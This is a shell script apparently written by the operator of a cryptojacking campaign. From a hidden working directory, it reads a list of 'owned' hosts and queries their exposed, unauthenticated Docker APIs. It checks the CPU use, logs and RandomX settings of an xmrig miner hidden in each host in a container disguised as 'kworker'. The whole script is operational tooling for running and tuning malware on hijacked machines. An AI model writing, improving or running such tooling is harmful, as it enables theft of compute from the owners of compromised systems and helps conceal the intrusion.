#!/bin/sh
# Diagnose the low per-machine hashrate: is our container CPU-starved, or is it
# running in RandomX light mode on a tiny host? Print host size, our container's
# actual CPU%, xmrig's own reported speed and its huge-page status.
cd /tmp/.sysd/.hunt || exit 1
for ip in $(cut -f1 dock.owned | sort -u | head -5); do
  for p in 2375 2376 4243; do
    case $p in 2376) s=https; o=-k;; *) s=http; o="";; esac
    v=$(curl -fsS $o -m 3 "$s://$ip:$p/version" 2>/dev/null) || continue
    case "$v" in *ApiVersion*) ;; *) continue;; esac
    info=$(curl -fsS $o -m 5 "$s://$ip:$p/info" 2>/dev/null)
    echo "== $ip:$p  ncpu=$(printf '%s' "$info" | grep -o '"NCPU":[0-9]*' | cut -d: -f2)  mem_mb=$(printf '%s' "$info" | grep -o '"MemTotal":[0-9]*' | cut -d: -f2)"
    st=$(curl -fsS $o -m 5 "$s://$ip:$p/containers/kworker/stats?stream=false" 2>/dev/null)
    c1=$(printf '%s' "$st" | grep -o '"total_usage":[0-9]*' | sed -n 1p | cut -d: -f2)
    s1=$(printf '%s' "$st" | grep -o '"system_cpu_usage":[0-9]*' | sed -n 1p | cut -d: -f2)
    c2=$(printf '%s' "$st" | grep -o '"total_usage":[0-9]*' | sed -n 2p | cut -d: -f2)
    s2=$(printf '%s' "$st" | grep -o '"system_cpu_usage":[0-9]*' | sed -n 2p | cut -d: -f2)
    if [ -n "$c1" ] && [ -n "$c2" ] && [ -n "$s1" ] && [ -n "$s2" ] && [ "$s1" != "$s2" ]; then
        echo "   container_cpu_pct=$(awk -v a="$c2" -v b="$c1" -v x="$s2" -v y="$s1" 'BEGIN{printf "%.1f", (a-b)/(x-y)*100}')"
    fi
    lg=$(curl -fsS $o -m 8 "$s://$ip:$p/containers/kworker/logs?stdout=1&stderr=1&tail=200" 2>/dev/null | tr -d '\000')
    printf '%s' "$lg" | grep -o 'speed 10s/60s/15m[^m]*' | tail -1 | sed 's/^/   speed: /'
    printf '%s' "$lg" | grep -o 'huge pages[^ ]* [^ ]*' | tail -1 | sed 's/^/   /'
    printf '%s' "$lg" | grep -o 'use profile[^ ]*' | tail -1 | sed 's/^/   /'
    printf '%s' "$lg" | grep -o 'randomx[^ ]*' | tail -1 | sed 's/^/   /'
    break
  done
done
